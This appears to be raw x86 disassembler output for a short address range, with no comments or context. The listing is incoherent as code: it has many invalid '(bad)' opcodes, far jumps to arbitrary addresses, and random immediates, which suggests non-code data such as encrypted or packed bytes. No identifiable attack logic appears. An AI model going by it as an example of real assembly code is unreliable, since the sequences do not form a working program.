  41b3ba:	mov    dl,0xb1
  41b3bc:	add    DWORD PTR [ecx],esp
  41b3be:	xchg   BYTE PTR [esi+edi*8-0x83930f4],dh
  41b3c5:	cmp    ah,BYTE PTR [edx+ecx*8+0x77]
  41b3c9:	cvtps2pd xmm3,QWORD PTR [eax-0x735be54e]
  41b3d0:	mov    al,0xc1
  41b3d2:	sbb    ebx,edi
  41b3d4:	stos   BYTE PTR es:[edi],al
  41b3d5:	(bad)  
  41b3d7:	mov    ds:0xf55b7fd8,al
  41b3dc:	retf   
  41b3dd:	pop    ebx
  41b3de:	sbb    BYTE PTR [edi],bh
  41b3e0:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41b3e2:	lahf   
  41b3e3:	mov    ch,0x8d
  41b3e5:	mov    cl,0x4b
  41b3e7:	cmp    al,0xe9
  41b3e9:	sbb    eax,DWORD PTR [ecx]
  41b3eb:	mov    eax,0xea965741
  41b3f0:	jae    0x41b3a3
  41b3f2:	xor    ebp,edx
  41b3f4:	pop    es
  41b3f5:	sbb    eax,0x75da0c9d
  41b3fa:	push   esp
  41b3fb:	xchg   ebx,eax
  41b3fc:	std    
  41b3fd:	sbb    dl,BYTE PTR [esp+edx*8-0x4]
  41b401:	aaa    
  41b402:	xor    dl,BYTE PTR [ebp-0x19b1e579]
  41b408:	xchg   BYTE PTR [ecx+ecx*2],dl
  41b40b:	shl    DWORD PTR [ebp+0x75],cl
  41b40e:	outs   dx,BYTE PTR ds:[esi]
  41b40f:	daa    
  41b410:	cmp    cl,BYTE PTR [edi+eiz*2+0x349ac721]
  41b417:	mov    edi,0x9721f98e
  41b41c:	pop    es
  41b41d:	pop    ecx
  41b41e:	mov    dl,BYTE PTR [esi-0x12fe5095]
  41b424:	sbb    DWORD PTR [si],edi
  41b427:	out    dx,al
  41b428:	sub    DWORD PTR [edi-0x56],0xe6ad3129
  41b42f:	push   es
  41b430:	mov    dl,0x15
  41b432:	mov    dl,0x87
  41b434:	add    DWORD PTR [ebp-0x7a],esi
  41b437:	cld    
  41b438:	(bad)  
  41b439:	or     al,0xb
  41b43b:	jecxz  0x41b46a
  41b43d:	xor    eax,0x539e5738
  41b442:	sub    bl,BYTE PTR [ebx]
  41b444:	imul   ebx,ebx,0x53
  41b447:	adc    al,0xd0
  41b449:	icebp  
  41b44a:	mov    edi,0x80028994
  41b44f:	loop   0x41b4cb
  41b451:	stos   DWORD PTR es:[edi],eax
  41b452:	sub    dl,bl
  41b454:	stos   BYTE PTR es:[edi],al
  41b455:	xchg   ebp,eax
  41b456:	pop    ebx
  41b457:	(bad)
  41b45b:	jecxz  0x41b4d4
  41b45d:	aaa    
  41b45e:	and    dh,0xd4
  41b461:	sbb    al,0x35
  41b463:	enter  0x9b2b,0xcb
  41b467:	push   esi
  41b468:	mov    WORD PTR [ebp+eax*8+0x657f1d3],ss
  41b46f:	push   ss
  41b470:	jae    0x41b49f
  41b472:	xor    DWORD PTR [ebx+0x7],ebp
  41b475:	lahf   
  41b476:	mov    ch,BYTE PTR [esi]
  41b478:	imul   esi,ebp,0x1
  41b47b:	xchg   ecx,eax
  41b47c:	addr16 inc edi
  41b47e:	test   BYTE PTR [edi],ah
  41b480:	int3   
  41b481:	xchg   edi,eax
  41b482:	or     eax,0xd45f3dd5
  41b487:	aaa    
  41b488:	xor    al,0xc
  41b48a:	and    eax,0xe3073268
  41b48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b490:	ja     0x41b41e
  41b492:	rol    DWORD PTR [edx+ecx*4-0x2789347e],1
  41b499:	dec    ebp
  41b49a:	addr16 inc edi
  41b49c:	mov    ebx,DWORD PTR [ebx+0x2569d646]
  41b4a2:	sub    edx,edi
  41b4a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4a5:	or     bh,dl
  41b4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4a8:	jmp    0xab97:0xfdf02591
  41b4af:	push   0xfffffff3
  41b4b1:	and    DWORD PTR [esi-0x617dfc07],0xffffffbe
  41b4b8:	add    edx,DWORD PTR fs:[eax+0x78]
  41b4bc:	dec    ebp
  41b4bd:	add    DWORD PTR [esi+0x15cdb28a],ebx
  41b4c3:	pusha  
  41b4c4:	aas    
  41b4c5:	xor    edx,ecx
  41b4c7:	enter  0xcc14,0xf3
  41b4cb:	clc    
  41b4cc:	stos   DWORD PTR es:[di],eax
  41b4ce:	data16 daa 
  41b4d0:	push   0xffffff97
  41b4d2:	pop    ecx
  41b4d3:	xlat   BYTE PTR ds:[ebx]
  41b4d4:	jecxz  0x41b458
  41b4d6:	xchg   eax,ebp
  41b4d8:	and    eax,0x2a6b32b7
  41b4dd:	mov    edi,0x147f9ee0
  41b4e2:	dec    ebx
  41b4e3:	popf   
  41b4e4:	mov    edx,0x74a7b8f2
  41b4e9:	xchg   edi,eax
  41b4ea:	jge    0x41b555
  41b4ec:	pop    edi
  41b4ed:	push   ebx
  41b4ee:	inc    ecx
  41b4ef:	das    
  41b4f0:	test   al,0x20
  41b4f2:	sub    al,BYTE PTR [ebx]
  41b4f4:	data16 ja 0x41b4cd
  41b4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4f8:	call   0x3311f6c6
  41b4fd:	call   0xb9b3:0xa1e9bcc7
  41b504:	daa    
  41b505:	mov    bh,BYTE PTR [eax+0x359689bf]
  41b50b:	shr    DWORD PTR [edx],cl
  41b50d:	push   es
  41b50e:	xchg   BYTE PTR [eax-0x1cb3f305],ch
  41b514:	and    BYTE PTR ds:0x8eb1efb2,dh
  41b51a:	or     BYTE PTR [edi+ecx*2+0x49b9cb0b],0x8d
  41b522:	mov    ch,0xc5
  41b524:	push   ecx
  41b525:	pop    ds
  41b526:	sbb    cl,BYTE PTR [edx+0x63ddcd16]
  41b52c:	xor    edx,DWORD PTR [eax-0x73277312]
  41b532:	sbb    DWORD PTR [ebp+0x1259d769],esi
  41b538:	jp     0x41b5b6
  41b53a:	daa    
  41b53b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b53c:	inc    edx
  41b53d:	jp     0x41b4f5
  41b53f:	mov    al,ds:0xa251eabc
  41b544:	jecxz  0x41b5c3
  41b546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b547:	ret    0xca9f
  41b54a:	sbb    DWORD PTR [ebx+0x66a12c49],edx
  41b550:	sbb    al,0x9b
  41b552:	and    dh,BYTE PTR [esi-0x6f54c630]
  41b558:	fcmovb st,st(4)
  41b55a:	pop    esi
  41b55b:	xchg   BYTE PTR [ecx+0x2d],dl
  41b55e:	mov    al,ds:0x50b184db
  41b563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b564:	jnp    0x41b509
  41b566:	outs   dx,BYTE PTR ds:[esi]
  41b567:	(bad)  
  41b568:	cmp    ebp,ebx
  41b56a:	ja     0x41b505
  41b56c:	push   ecx
  41b56d:	loop   0x41b512
  41b56f:	retf   0x9966
  41b572:	mov    ebp,edx
  41b574:	pusha  
  41b575:	add    ch,bh
  41b577:	call   0x121d:0x924c1faa
  41b57e:	loop   0x41b55e
  41b580:	(bad)  
  41b581:	(bad)  
  41b582:	mov    al,ds:0xac726b9d
  41b587:	retf   0xf5c0
  41b58a:	push   0x42
  41b58c:	inc    ebp
  41b58d:	mov    ch,0xaf
  41b58f:	xchg   ebp,eax
  41b590:	(bad)  
  41b591:	in     al,dx
  41b592:	pop    ebp
  41b593:	xor    dl,BYTE PTR [ebx]
  41b595:	ss (bad) 
  41b597:	stc    
  41b598:	xchg   edx,eax
  41b599:	(bad)  
  41b59b:	mov    eax,ds:0xadf6230b
  41b5a0:	test   al,0xf8
  41b5a2:	jg     0x41b59e
  41b5a4:	ss mov dl,0x80
  41b5a7:	xor    DWORD PTR [ebx-0xb],esp
  41b5aa:	mov    ds:0xddad7f23,eax
  41b5b0:	add    esp,ecx
  41b5b2:	arpl   WORD PTR [ecx],si
  41b5b4:	in     al,0x17
  41b5b6:	mov    esp,0xa6d601fa
  41b5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5bc:	fadd   st(5),st
  41b5be:	mov    bh,0xb2
  41b5c0:	stos   BYTE PTR es:[edi],al
  41b5c1:	fdivr  QWORD PTR [ecx-0x4c]
  41b5c4:	pop    esp
  41b5c5:	gs xchg ebx,eax
  41b5c7:	shl    BYTE PTR [ecx-0x7f],0x99
  41b5cb:	sar    DWORD PTR [edi+0x25dcb750],1
  41b5d1:	repz mov bh,BYTE PTR [ebp+0x46]
  41b5d5:	fcmovne st,st(2)
  41b5d7:	sub    BYTE PTR [ecx+0x3f4ce3d4],0xfb
  41b5de:	cmp    BYTE PTR [esi-0x25],bh
  41b5e1:	sbb    bh,ch
  41b5e3:	mov    ch,0xba
  41b5e5:	ret    
  41b5e6:	inc    edi
  41b5e7:	and    DWORD PTR [eax],0xb3672bad
  41b5ed:	(bad)  
  41b5ee:	mov    ebx,0xaf81f5a4
  41b5f3:	in     al,0x50
  41b5f5:	dec    ebx
  41b5f6:	add    ecx,esi
  41b5f8:	stc    
  41b5f9:	enter  0x1b4c,0xb9
  41b5fd:	mov    dh,0xca
  41b5ff:	dec    eax
  41b600:	aaa    
  41b601:	mov    DWORD PTR [eax+0x3847eef3],esi
  41b607:	int    0xf0
  41b609:	out    dx,al
  41b60a:	pusha  
  41b60b:	sahf   
  41b60c:	push   esi
  41b60d:	or     eax,0xf47a1cd9
  41b612:	adc    DWORD PTR [ecx+0x45],esp
  41b615:	inc    edx
  41b616:	(bad)  
  41b617:	mov    dh,0x75
  41b619:	xlat   BYTE PTR ds:[ebx]
  41b61a:	inc    edi
  41b61b:	test   dh,dh
  41b61d:	cmp    ch,cl
  41b61f:	loopne 0x41b5bc
  41b621:	call   0x567ac1fc
  41b626:	(bad)  
  41b627:	push   eax
  41b628:	jge    0x41b5d6
  41b62a:	inc    eax
  41b62b:	xor    dl,BYTE PTR [ebx+0x7a]
  41b62e:	jmp    0x93a4:0x4ca764b4
  41b635:	std    
  41b636:	xchg   BYTE PTR [eax-0x64],cl
  41b639:	in     al,0x6d
  41b63b:	xor    al,0x35
  41b63d:	pop    edx
  41b63e:	mov    fs,WORD PTR [ecx+0x81de229]
  41b644:	div    edi
  41b646:	fimul  DWORD PTR [ebx]
  41b648:	les    esp,FWORD PTR [esi+0x515ac3cb]
  41b64e:	dec    edx
  41b64f:	mov    edx,0x5e55106e
  41b654:	scas   eax,DWORD PTR es:[edi]
  41b655:	jne    0x41b6c6
  41b657:	std    
  41b658:	push   0x1a97fbf0
  41b65d:	icebp  
  41b65e:	sar    BYTE PTR [esi],0xb3
  41b661:	push   es
  41b662:	mov    DWORD PTR [esp+edi*1],edx
  41b665:	lds    ecx,FWORD PTR [ebx]
  41b667:	aam    0x9f
  41b669:	mov    DWORD PTR [edi],ecx
  41b66b:	in     al,0x40
  41b66d:	ret    
  41b66e:	aam    0x66
  41b670:	(bad)  
  41b671:	adc    al,0x74
  41b673:	je     0x41b68f
  41b675:	adc    BYTE PTR [esi+0x34f337a4],cl
  41b67b:	or     ah,BYTE PTR [ecx+0x7ef88c9c]
  41b681:	sbb    bh,bh
  41b683:	ja     0x41b642
  41b685:	adc    ah,dh
  41b687:	mov    ebp,0xfc4bf6f0
  41b68c:	cmp    eax,0x92c8de51
  41b691:	adc    ecx,DWORD PTR [edx-0x4fa6e003]
  41b697:	xor    eax,0xa37b5b34
  41b69c:	or     dx,WORD PTR [edx+0x47f4bb9c]
  41b6a3:	sbb    al,0x0
  41b6a5:	and    eax,0xb7d240f4
  41b6aa:	repnz cdq 
  41b6ac:	inc    edi
  41b6ad:	loope  0x41b71a
  41b6af:	xchg   esp,eax
  41b6b0:	jge    0x41b677
  41b6b2:	dec    esi
  41b6b3:	or     al,0x2f
  41b6b5:	pop    ecx
  41b6b6:	inc    esp
  41b6b7:	out    0x6f,al
  41b6b9:	mov    eax,ds:0x7d31386c
  41b6be:	jmp    0x4aa7:0x279b17dd
  41b6c5:	(bad)  
  41b6c6:	mov    dh,0x56
  41b6c8:	loopne 0x41b6b3
  41b6ca:	gs int 0x88
  41b6cd:	inc    eax
  41b6ce:	(bad)  
  41b6cf:	adc    cl,bh
  41b6d1:	mov    ah,0x39
  41b6d3:	ret    0x5711
  41b6d6:	dec    esp
  41b6d7:	mov    bh,0x7d
  41b6d9:	fs mov ebx,0x8c2831bb
  41b6df:	fwait
  41b6e0:	and    BYTE PTR [esi+0x4b127ba7],0x96
  41b6e7:	sar    DWORD PTR [esi],0xe9
  41b6ea:	dec    ebx
  41b6eb:	add    ch,dh
  41b6ed:	arpl   WORD PTR [eax-0x64],dx
  41b6f0:	test   eax,0x9c59e598
  41b6f5:	retf   0x9608
  41b6f8:	(bad)  
  41b6f9:	int3   
  41b6fa:	mov    ebp,0xb0a65a0c
  41b6ff:	inc    esi
  41b700:	out    0x1d,al
  41b702:	fisubr WORD PTR [edx]
  41b704:	in     eax,0x83
  41b706:	ds das 
  41b708:	inc    ebx
  41b709:	in     al,0x3
  41b70b:	cwde   
  41b70c:	outs   dx,BYTE PTR ds:[esi]
  41b70d:	mov    DWORD PTR [ebp+0x72],ebx
  41b710:	inc    esp
  41b711:	mov    edx,0x466fd1f3
  41b716:	lods   eax,DWORD PTR ds:[esi]
  41b717:	or     ebp,ebp
  41b719:	call   0x71f4:0x5f167426
  41b720:	inc    ebx
  41b721:	leave  
  41b722:	aam    0x1b
  41b724:	test   DWORD PTR [ebx+0x60],esi
  41b727:	cmp    edi,DWORD PTR [eax+0x11d66f7]
  41b72d:	cmc    
  41b72e:	mov    ch,dl
  41b730:	inc    esp
  41b731:	bound  esi,QWORD PTR ss:[eax+0x41]
  41b735:	adc    cl,BYTE PTR [edx-0x3f8f49ff]
  41b73b:	inc    edx
  41b73c:	inc    edx
  41b73d:	xlat   BYTE PTR ds:[ebx]
  41b73e:	add    ecx,DWORD PTR [esi+eax*8-0x6ac7c7a]
  41b745:	xchg   ebp,eax
  41b746:	int3   
  41b747:	jb     0x41b709
  41b749:	nop
  41b74a:	and    DWORD PTR [ebp-0x653204b6],edx
  41b750:	push   es
  41b751:	lock mov cl,0x49
  41b754:	pop    edi
  41b755:	push   ecx
  41b756:	jb     0x41b793
  41b758:	clc    
  41b759:	dec    eax
  41b75a:	popf   
  41b75b:	mov    cl,0x3
  41b75d:	xlat   BYTE PTR ds:[ebx]
  41b75e:	mov    al,ds:0xa4a3780c
  41b763:	call   0xebaf:0xb307543f
  41b76a:	leave  
  41b76b:	loope  0x41b7b8
  41b76d:	lds    edx,FWORD PTR [esi]
  41b76f:	sbb    al,0x53
  41b771:	pop    ds
  41b772:	addr16 sbb eax,0xf8b233b9
  41b778:	adc    ecx,DWORD PTR [ebx+0x4848b01a]
  41b77e:	mov    eax,0x53b65b90
  41b783:	les    eax,FWORD PTR [eax]
  41b785:	enter  0xd859,0xaa
  41b789:	mov    ch,0x50
  41b78b:	pushf  
  41b78c:	mov    edi,edx
  41b78e:	mov    ?,WORD PTR [eax-0xa3a13a0]
  41b794:	aam    0x48
  41b796:	inc    esp
  41b797:	test   ebp,eax
  41b799:	and    ebp,DWORD PTR [ebx+0x1b]
  41b79c:	mov    edx,0xb6cde35b
  41b7a1:	fst    QWORD PTR [esi+0x60]
  41b7a4:	mov    bh,0xba
  41b7a6:	(bad)  
  41b7a7:	jmp    0x41b78c
  41b7a9:	or     cl,ah
  41b7ab:	mov    ebx,0xe4453f81
  41b7b0:	xchg   ebp,eax
  41b7b1:	or     ecx,DWORD PTR [esi-0x36]
  41b7b4:	repnz addr16 mov esi,0x82dd6e07
  41b7bb:	inc    esp
  41b7bc:	jne    0x41b7f5
  41b7be:	addr16 add al,0xbe
  41b7c1:	(bad)  
  41b7c2:	lods   al,BYTE PTR ds:[esi]
  41b7c3:	rol    DWORD PTR [edi],cl
  41b7c5:	arpl   WORD PTR [ecx-0x300877c3],sp
  41b7cb:	push   ebp
  41b7cc:	addr16 pop ss
  41b7ce:	(bad)  
  41b7cf:	clc    
  41b7d0:	mov    bl,0xcc
  41b7d2:	sub    DWORD PTR [ebp+0x39259809],edi
  41b7d8:	(bad)  
  41b7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7da:	xor    al,0x11
  41b7dc:	retf   
  41b7dd:	mov    al,0x2c
  41b7df:	dec    edx
  41b7e0:	jle    0x41b7c5
  41b7e2:	mov    cl,0xc6
  41b7e4:	push   edi
  41b7e5:	(bad)  
  41b7e6:	push   ss
  41b7e7:	mov    eax,0xed99b83b
  41b7ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7ed:	pop    edx
  41b7ee:	mov    dl,0xca
  41b7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f1:	stos   DWORD PTR es:[edi],eax
  41b7f2:	cmp    eax,0x8fda3261
  41b7f7:	add    al,0xa8
  41b7f9:	cld    
  41b7fa:	mov    ecx,ebp
  41b7fc:	mov    edx,0xadff99f5
  41b801:	inc    ecx
  41b802:	adc    esp,ecx
  41b804:	push   eax
  41b805:	js     0x41b787
  41b807:	mov    eax,0x8573c6ea
  41b80c:	mov    ch,cl
  41b80e:	xlat   BYTE PTR ds:[ebx]
  41b80f:	int3   
  41b810:	stos   BYTE PTR es:[edi],al
  41b811:	daa    
  41b812:	(bad)  
  41b813:	cmc    
  41b814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b815:	aaa    
  41b816:	out    0x9d,al
  41b818:	call   0x5b91225c
  41b81d:	mov    dh,0xfe
  41b81f:	aas    
  41b820:	jmp    0x41b87f
  41b822:	aaa    
  41b823:	add    ch,BYTE PTR [edi+0x50]
  41b826:	xchg   ebx,eax
  41b827:	sub    DWORD PTR [esi],esp
  41b829:	xchg   edi,eax
  41b82a:	mov    ds:0xab57ef80,al
  41b82f:	stos   BYTE PTR es:[edi],al
  41b830:	js     0x41b7c4
  41b832:	dec    esp
  41b833:	mov    bh,0x69
  41b835:	pop    edi
  41b836:	ss call 0x2662:0xbe70d1e3
  41b83e:	cmp    bl,BYTE PTR [ebx-0x7daae66f]
  41b844:	iret   
  41b845:	lea    esi,[esi-0x33]
  41b848:	stos   BYTE PTR es:[edi],al
  41b849:	jns    0x41b862
  41b84b:	les    eax,FWORD PTR [edx-0x5d]
  41b84e:	or     DWORD PTR [esi-0x6796e490],eax
  41b854:	cmp    BYTE PTR [edx-0x20bd704f],cl
  41b85a:	mov    bl,0x34
  41b85c:	or     ah,0x22
  41b85f:	fnstenv [ebp-0x55f7651d]
  41b865:	(bad)
  41b868:	call   0xb024d855
  41b86d:	mov    ds:0x43a34376,al
  41b872:	out    dx,eax
  41b873:	movq   mm6,mm2
  41b876:	adc    al,0x3c
  41b878:	mov    BYTE PTR [ebp-0x3ed0841b],dl
  41b87e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b87f:	mov    ebx,edi
  41b881:	cmp    eax,0x80b27d33
  41b886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b887:	mov    al,ds:0x5a6e92f
  41b88c:	or     eax,0x26ffb24f
  41b891:	xchg   ecx,eax
  41b892:	add    BYTE PTR [eax-0x4d5cba19],dh
  41b898:	sub    edi,esp
  41b89a:	add    cl,BYTE PTR [ebp-0x3b79ee00]
  41b8a0:	xor    ebp,DWORD PTR [ebp-0x89864ed]
  41b8a6:	mov    cl,0x49
  41b8a8:	pop    eax
  41b8a9:	jae    0x41b8d9
  41b8ab:	adc    DWORD PTR [eax+0x5c1cfe82],esp
  41b8b1:	cmc    
  41b8b2:	les    ebp,FWORD PTR ds:0xe6c0c1a6
  41b8b8:	repz push ds
  41b8ba:	push   ebx
  41b8bb:	stc    
  41b8bc:	push   eax
  41b8bd:	call   0x974a:0x278f9704
  41b8c4:	loop   0x41b846
  41b8c6:	add    eax,0x17d6dc96
  41b8cb:	pushf  
  41b8cc:	or     ecx,DWORD PTR [esi]
  41b8ce:	or     DWORD PTR [edi+0x31],ebp
  41b8d1:	rcl    DWORD PTR [ebx],1
  41b8d3:	ror    BYTE PTR ds:0x4bcdc6ae,1
  41b8d9:	pop    ds
  41b8da:	test   edx,0xc98a3757
  41b8e0:	ret    0x73d5
  41b8e3:	sahf   
  41b8e4:	enter  0xa361,0xf7
  41b8e8:	in     eax,0xf5
  41b8ea:	jp     0x41b8e5
  41b8ec:	jecxz  0x41b886
  41b8ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8ef:	aas    
  41b8f0:	xchg   ebx,eax
  41b8f1:	rcl    DWORD PTR [esi+0x6c],0xd5
  41b8f5:	jbe    0x41b929
  41b8f7:	cmp    esi,DWORD PTR ds:0x530c60d7
  41b8fd:	pop    ebx
  41b8fe:	mov    BYTE PTR [eax],bl
  41b900:	push   cs
  41b901:	xchg   edx,eax
  41b902:	xor    eax,0x8e0a2b00
  41b907:	mov    esp,0xb9e677a1
  41b90c:	ds inc edx
  41b90e:	lock add BYTE PTR [ebx+0x27327b07],al
  41b915:	pop    edi
  41b916:	cmp    ebx,DWORD PTR ds:0xe0053d8d
  41b91c:	push   ebx
  41b91d:	das    
  41b91e:	mov    ?,WORD PTR [edx-0x18]
  41b921:	(bad)  
  41b922:	dec    ebx
  41b923:	loope  0x41b953
  41b925:	sbb    DWORD PTR [edx+0x5ac73fa5],0x935fa1eb
  41b92f:	fiadd  WORD PTR ss:[eax]
  41b932:	sar    BYTE PTR [edi],cl
  41b934:	jo     0x41b9a1
  41b936:	xchg   bh,ch
  41b938:	fmul   DWORD PTR [esp+ebx*8]
  41b93b:	sar    BYTE PTR [edi],1
  41b93d:	fisubr WORD PTR [ecx+0x6]
  41b940:	enter  0x6829,0x1d
  41b944:	pop    ss
  41b945:	pop    es
  41b946:	mov    dl,0xd7
  41b948:	xchg   esp,eax
  41b949:	and    eax,0x80413508
  41b94e:	mov    WORD PTR [eax+eiz*4-0x7c3285e3],ds
  41b955:	popf   
  41b956:	mov    dh,ah
  41b958:	or     dh,0x4f
  41b95b:	sti    
  41b95c:	inc    esp
  41b95d:	inc    esp
  41b95e:	rcr    esp,0x92
  41b961:	jg     0x41b907
  41b963:	mov    ds:0xe26a5da1,al
  41b968:	cmp    esi,DWORD PTR [eax+0x3b9574b4]
  41b96e:	inc    eax
  41b96f:	(bad)  
  41b970:	ss jecxz 0x41b9be
  41b973:	rcl    dl,1
  41b975:	mov    ds:0xc1a9e99c,al
  41b97a:	pop    ecx
  41b97b:	push   ebp
  41b97c:	outs   dx,BYTE PTR gs:[esi]
  41b97e:	jae    0x41b9fe
  41b980:	pop    esi
  41b981:	fbstp  TBYTE PTR [edx+0x1]
  41b984:	imul   edi,ebp,0xa15e1787
  41b98a:	xchg   al,dl
  41b98c:	rol    DWORD PTR [eax+ebp*1],cl
  41b98f:	ret    
  41b990:	mov    al,0x87
  41b992:	xor    edi,ebx
  41b994:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41b996:	push   esp
  41b997:	lock mov bl,0xd9
  41b99a:	xor    edi,ebx
  41b99c:	xchg   edi,eax
  41b99d:	xor    BYTE PTR [edx+eax*8-0xd94dae4],0xe
  41b9a5:	shl    ebp,0xa7
  41b9a8:	add    DWORD PTR [ecx],0xe
  41b9ab:	xchg   edx,eax
  41b9ac:	mov    cl,0xc6
  41b9ae:	xchg   DWORD PTR [esi],eax
  41b9b0:	enter  0x884b,0x14
  41b9b4:	mov    dh,0xfc
  41b9b6:	stos   BYTE PTR es:[edi],al
  41b9b7:	sbb    BYTE PTR [edx+0x6c69d1d4],dl
  41b9bd:	gs in  al,0x8a
  41b9c0:	stos   BYTE PTR es:[edi],al
  41b9c1:	(bad)  
  41b9c2:	out    dx,eax
  41b9c3:	lea    ebp,[edi-0x2bf861f7]
  41b9c9:	push   esi
  41b9ca:	sub    al,0xc7
  41b9cc:	push   esi
  41b9cd:	xor    bh,0xfe
  41b9d0:	ds cli 
  41b9d2:	add    esp,edi
  41b9d4:	outs   dx,BYTE PTR ds:[esi]
  41b9d5:	popa   
  41b9d6:	xchg   ebp,eax
  41b9d7:	or     BYTE PTR [edi+ecx*2],al
  41b9da:	lahf   
  41b9db:	sbb    eax,0xd4eed96f
  41b9e0:	jno    0x41b988
  41b9e2:	sbb    esp,eax
  41b9e4:	mov    ds:0xb4fc8779,al
  41b9e9:	dec    eax
  41b9ea:	outs   dx,DWORD PTR ds:[esi]
  41b9eb:	sar    DWORD PTR [edi+0x3d],1
  41b9ee:	sbb    eax,0xf7ab1ab2
  41b9f3:	lock and DWORD PTR [edi],eax
  41b9f6:	nop
  41b9f7:	inc    esp
  41b9f8:	outs   dx,BYTE PTR ds:[esi]
  41b9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9fa:	push   0x828fe1f8
  41b9ff:	cld    
  41ba00:	pushf  
  41ba01:	ror    BYTE PTR [ebx+0x53644c5a],cl
  41ba07:	adc    eax,0x8d0549d8
  41ba0c:	and    DWORD PTR ds:0xcdb7b0f0,ebx
  41ba12:	out    0x90,al
  41ba14:	inc    esp
  41ba15:	mov    bl,BYTE PTR [ebx+eiz*4-0x40]
  41ba19:	xchg   DWORD PTR [ecx],edx
  41ba1b:	push   eax
  41ba1c:	call   0x9c8b458
  41ba21:	pop    edi
  41ba22:	jbe    0x41b9a4
  41ba24:	in     eax,0x17
  41ba26:	sub    DWORD PTR [eax],0x30
  41ba29:	mov    cl,0xa1
  41ba2b:	add    ch,ch
  41ba2d:	push   es
  41ba2e:	inc    edi
  41ba2f:	sahf   
  41ba30:	les    esp,FWORD PTR [eax]
  41ba32:	and    DWORD PTR [ebx+0x75],eax
  41ba35:	into   
  41ba36:	sub    ebp,0xffffffd8
  41ba39:	int3   
  41ba3a:	mov    ebx,0xab50335b
  41ba3f:	adc    edx,DWORD PTR [esi]
  41ba41:	xchg   esp,eax
  41ba42:	test   BYTE PTR [edx-0x3019d7f],al
  41ba48:	fistp  DWORD PTR [edi+0x46e1b37f]
  41ba4e:	mov    dl,0xca
  41ba50:	nop
  41ba51:	xchg   esi,eax
  41ba52:	add    al,0xe9
  41ba54:	sub    eax,0x9d388014
  41ba59:	push   ebx
  41ba5a:	or     BYTE PTR [ebp+0x6a],0xf4
  41ba5e:	mov    eax,0xd7f764ee
  41ba63:	xchg   BYTE PTR [esi+edx*2],al
  41ba66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba67:	mov    WORD PTR [eax],es
  41ba69:	adc    DWORD PTR [edx],esp
  41ba6b:	fldenv [ebp-0x33e1a426]
  41ba71:	rcr    DWORD PTR [ebp-0x27],1
  41ba74:	pop    ebx
  41ba75:	in     eax,0x23
  41ba77:	mov    edi,ebx
  41ba79:	pushf  
  41ba7a:	mov    edx,0xee59b130
  41ba7f:	retf   0xd833
  41ba82:	pop    es
  41ba83:	or     DWORD PTR [edx],0xffffff9b
  41ba86:	push   esp
  41ba87:	fdiv   QWORD PTR [edi-0x298e1e]
  41ba8d:	sbb    al,0x60
  41ba8f:	sbb    cl,BYTE PTR [edx+0xe20d4b]
  41ba95:	pop    esp
  41ba96:	mov    gs,edi
  41ba98:	xchg   esi,eax
  41ba99:	das    
  41ba9a:	stos   BYTE PTR es:[edi],al
  41ba9b:	push   esp
  41ba9c:	pop    ebp
  41ba9d:	adc    al,BYTE PTR [edi]
  41ba9f:	sahf   
  41baa0:	into   
  41baa1:	stc    
  41baa2:	icebp  
  41baa3:	mov    edx,0xfc284b40
  41baa8:	(bad)  
  41baa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baaa:	mov    al,0x64
  41baac:	sub    eax,0x148eecd1
  41bab1:	mov    ebp,0x45c42893
  41bab6:	push   ebx
  41bab7:	mov    ?,WORD PTR [eax+0x40b83cb6]
  41babd:	xchg   DWORD PTR [eax+ecx*1-0x661ebdd0],ebp
  41bac4:	sub    al,0x22
  41bac6:	neg    BYTE PTR [ebp-0x8]
  41bac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baca:	call   DWORD PTR [eax-0x74b34965]
  41bad0:	jecxz  0x41ba65
  41bad2:	ins    BYTE PTR es:[edi],dx
  41bad3:	(bad)  
  41bad4:	dec    edi
  41bad5:	mov    ah,0xb2
  41bad7:	int3   
  41bad8:	push   ss
  41bad9:	sbb    eax,DWORD PTR [edi+0x4b]
  41badc:	sbb    al,0xfe
  41bade:	push   esi
  41badf:	out    dx,al
  41bae0:	mov    eax,0x89ba1a91
  41bae5:	push   0xffffffd1
  41bae7:	aam    0xa9
  41bae9:	xor    al,0x5
  41baeb:	push   0xffffffdf
  41baed:	jnp    0x41babe
  41baef:	cs xchg esp,eax
  41baf1:	test   BYTE PTR [edi-0x16],0x3e
  41baf5:	shl    eax,1
  41baf7:	inc    esi
  41baf8:	mov    ds:0xf9be6a67,eax
  41bafd:	dec    esp
  41bafe:	out    0x4,eax
  41bb00:	jo     0x678c44ed
  41bb06:	xor    ecx,DWORD PTR [edi]
  41bb08:	mov    BYTE PTR [esp+ebx*1-0x41],0x69
  41bb0d:	sub    DWORD PTR [esi-0x21519d2a],ecx
  41bb13:	sub    BYTE PTR [edx+0x77],cl
  41bb16:	js     0x41bab8
  41bb18:	test   eax,0x61fb6687
  41bb1d:	jl     0x41bad9
  41bb1f:	adc    eax,0xd71a21e8
  41bb24:	jp     0x41bafc
  41bb26:	mov    cl,0x62
  41bb28:	jae    0x41bb08
  41bb2a:	cmp    eax,0x93c4a7c5
  41bb2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb30:	mov    fs,WORD PTR [edx-0x77a846f5]
